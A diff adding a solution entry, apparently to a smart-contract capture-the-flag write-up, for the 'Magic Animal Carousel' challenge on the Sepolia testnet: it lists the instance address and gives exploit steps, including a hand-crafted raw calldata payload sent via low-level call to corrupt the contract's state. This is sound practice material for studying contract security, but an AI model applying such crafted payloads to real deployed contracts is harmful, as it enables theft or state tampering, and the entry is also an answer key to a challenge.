@@ -688,3 +688,21 @@ let zeroAddr = "0x0000000000000000000000000000000000000000";
 await lock.changeController(vbar, r, sbar, zeroAddr);
 
 ```
+
+## Problem 33: Magic Animal Carousel
+
+- creation tx: [0x7a6b89eca78ca2dd75f744d836996102524939967f0c57b5312f833f91e610ad](https://sepolia.etherscan.io/tx/0x7a6b89eca78ca2dd75f744d836996102524939967f0c57b5312f833f91e610ad)
+- instance contract: [0xd47FF4A59a61a15f5eCe70B5dB86b73C2972BFcB](https://sepolia.etherscan.io/address/0xd47ff4a59a61a15f5ece70b5db86b73c2972bfcb)
+
+**Solution**
+
+Refer to [`src/33-MagicAnimalCarousel/MagicAnimalCarousel.t.sol`](src/33-MagicAnimalCarousel/MagicAnimalCarousel.t.sol).
+
+```ts
+await contract.setAnimalAndSpin("bear");
+
+// Sent a low-level call to contract.address with the following calldata:
+// 0x932289cc00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000c30303030303030303030ffff0000000000000000000000000000000000000000
+
+await contract.setAnimalAndSpin("lion");
+```
